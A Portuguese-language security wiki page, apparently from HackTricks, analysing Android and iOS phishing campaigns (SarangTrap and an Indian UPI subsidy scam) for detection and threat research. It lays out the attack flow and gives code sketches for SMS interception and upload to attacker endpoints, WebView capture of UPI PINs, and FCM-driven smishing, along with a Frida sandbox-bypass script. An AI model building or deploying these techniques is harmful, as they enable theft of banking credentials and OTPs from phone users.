# Phishing Móvel & Distribuição de Apps Maliciosos (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Esta página cobre técnicas usadas por atores de ameaça para distribuir **APKs maliciosos do Android** e **perfis de configuração móvel do iOS** através de phishing (SEO, engenharia social, lojas falsas, aplicativos de namoro, etc.).
> O material é adaptado da campanha SarangTrap exposta pelo Zimperium zLabs (2025) e outras pesquisas públicas.

## Fluxo de Ataque

1. **Infraestrutura de SEO/Phishing**
* Registrar dezenas de domínios semelhantes (namoro, compartilhamento em nuvem, serviço de carro…).
– Usar palavras-chave e emojis em língua local no elemento `<title>` para ranquear no Google.
– Hospedar *tanto* as instruções de instalação do Android (`.apk`) quanto do iOS na mesma página de destino.
2. **Download da Primeira Etapa**
* Android: link direto para um APK *não assinado* ou de “loja de terceiros”.
* iOS: `itms-services://` ou link HTTPS simples para um perfil **mobileconfig** malicioso (veja abaixo).
3. **Engenharia Social Pós-instalação**
* Na primeira execução, o aplicativo pede um **código de convite / verificação** (ilusão de acesso exclusivo).
* O código é **POSTado via HTTP** para o Comando e Controle (C2).
* O C2 responde `{"success":true}` ➜ o malware continua.
* Análise dinâmica de Sandbox / AV que nunca envia um código válido não vê **comportamento malicioso** (evasão).
4. **Abuso de Permissão em Tempo de Execução** (Android)
* Permissões perigosas são solicitadas **apenas após resposta positiva do C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Compilações mais antigas também pediam permissões de SMS -->
```
* Variantes recentes **removem `<uses-permission>` para SMS do `AndroidManifest.xml`** mas mantêm o caminho de código Java/Kotlin que lê SMS através de reflexão ⇒ reduz a pontuação estática enquanto ainda é funcional em dispositivos que concedem a permissão via abuso de `AppOps` ou alvos antigos.
5. **Interface de Facade & Coleta em Segundo Plano**
* O aplicativo mostra visualizações inofensivas (visualizador de SMS, seletor de galeria) implementadas localmente.
* Enquanto isso, exfiltra:
- IMEI / IMSI, número de telefone
- Dump completo de `ContactsContract` (array JSON)
- JPEG/PNG de `/sdcard/DCIM` comprimido com [Luban](https://github.com/Curzibn/Luban) para reduzir o tamanho
- Conteúdo opcional de SMS (`content://sms`)
Os payloads são **compactados em lote** e enviados via `HTTP POST /upload.php`.
6. **Técnica de Entrega do iOS**
* Um único **perfil de configuração móvel** pode solicitar `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. para inscrever o dispositivo em supervisão semelhante a “MDM”.
* Instruções de engenharia social:
1. Abra Configurações ➜ *Perfil baixado*.
2. Toque em *Instalar* três vezes (capturas de tela na página de phishing).
3. Confie no perfil não assinado ➜ o atacante ganha direito a *Contatos* & *Foto* sem revisão da App Store.
7. **Camada de Rede**
* HTTP simples, frequentemente na porta 80 com cabeçalho HOST como `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (sem TLS → fácil de detectar).

## Testes Defensivos / Dicas de Red-Team

* **Bypass de Análise Dinâmica** – Durante a avaliação de malware, automatize a fase do código de convite com Frida/Objection para alcançar o ramo malicioso.
* **Diferença entre Manifesto e Tempo de Execução** – Compare `aapt dump permissions` com `PackageManager#getRequestedPermissions()` em tempo de execução; permissões perigosas ausentes são um sinal de alerta.
* **Canário de Rede** – Configure `iptables -p tcp --dport 80 -j NFQUEUE` para detectar explosões de POST não sólidas após a entrada do código.
* **Inspeção de mobileconfig** – Use `security cms -D -i profile.mobileconfig` no macOS para listar `PayloadContent` e identificar direitos excessivos.

## Ideias de Detecção para Blue-Team

* **Transparência de Certificado / Análise de DNS** para capturar explosões súbitas de domínios ricos em palavras-chave.
* **Regex de User-Agent & Caminho**: `(?i)POST\s+/(check|upload)\.php` de clientes Dalvik fora do Google Play.
* **Telemetria de Código de Convite** – POST de códigos numéricos de 6–8 dígitos logo após a instalação do APK pode indicar preparação.
* **Assinatura de MobileConfig** – Bloquear perfis de configuração não assinados via política MDM.

## Snippet Útil do Frida: Bypass Automático do Código de Convite
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Indicadores (Genéricos)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + Padrão FCM C2

Esse padrão foi observado em campanhas que abusam de temas de benefícios governamentais para roubar credenciais e OTPs do UPI indiano. Operadores encadeiam plataformas respeitáveis para entrega e resiliência.

### Cadeia de entrega através de plataformas confiáveis
- Isca de vídeo no YouTube → descrição contém um link curto
- Link curto → site de phishing do GitHub Pages imitando o portal legítimo
- O mesmo repositório do GitHub hospeda um APK com um falso selo “Google Play” que liga diretamente ao arquivo
- Páginas de phishing dinâmicas estão ativas no Replit; o canal de comando remoto usa Firebase Cloud Messaging (FCM)

### Dropper com payload embutido e instalação offline
- O primeiro APK é um instalador (dropper) que envia o malware real em `assets/app.apk` e solicita ao usuário que desative Wi‑Fi/dados móveis para reduzir a detecção na nuvem.
- O payload embutido é instalado sob um rótulo inócuo (por exemplo, “Atualização Segura”). Após a instalação, tanto o instalador quanto o payload estão presentes como aplicativos separados.

Dica de triagem estática (grep para payloads embutidos):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Descoberta dinâmica de endpoints via shortlink
- O malware busca uma lista de endpoints ativos em texto simples, separados por vírgulas, de um shortlink; transformações simples de string produzem o caminho final da página de phishing.

Exemplo (sanitizado):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-código:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Coleta de credenciais UPI baseada em WebView
- A etapa “Fazer pagamento de ₹1 / UPI‑Lite” carrega um formulário HTML do atacante a partir do endpoint dinâmico dentro de um WebView e captura campos sensíveis (telefone, banco, PIN UPI) que são `POST`ados para `addup.php`.

Loader mínimo:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Autopropagação e interceptação de SMS/OTP
- Permissões agressivas são solicitadas na primeira execução:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Contatos são usados para enviar em massa SMS smishing do dispositivo da vítima.
- SMS recebidos são interceptados por um receptor de transmissão e enviados com metadados (remetente, corpo, slot SIM, ID aleatório por dispositivo) para `/addsm.php`.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) como C2 resiliente
- O payload se registra no FCM; mensagens push carregam um campo `_type` usado como um interruptor para acionar ações (por exemplo, atualizar modelos de texto de phishing, alternar comportamentos).

Exemplo de payload FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Esboço do manipulador:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Padrões de caça e IOCs
- APK contém carga secundária em `assets/app.apk`
- WebView carrega pagamento de `gate.htm` e exfiltra para `/addup.php`
- Exfiltração de SMS para `/addsm.php`
- Busca de configuração impulsionada por link curto (por exemplo, `rebrand.ly/*`) retornando endpoints CSV
- Apps rotulados como genéricos “Atualizar/Atualização Segura”
- Mensagens `data` do FCM com um discriminador `_type` em apps não confiáveis

### Ideias de detecção e defesa
- Marcar apps que instruem os usuários a desativar a rede durante a instalação e, em seguida, carregar um segundo APK de `assets/`.
- Alertar sobre a tupla de permissões: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + fluxos de pagamento baseados em WebView.
- Monitoramento de saída para `POST /addup.php|/addsm.php` em hosts não corporativos; bloquear infraestrutura conhecida.
- Regras de EDR móvel: app não confiável registrando-se para FCM e ramificando em um campo `_type`.

---

## Referências

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)

{{#include ../../banners/hacktricks-training.md}}
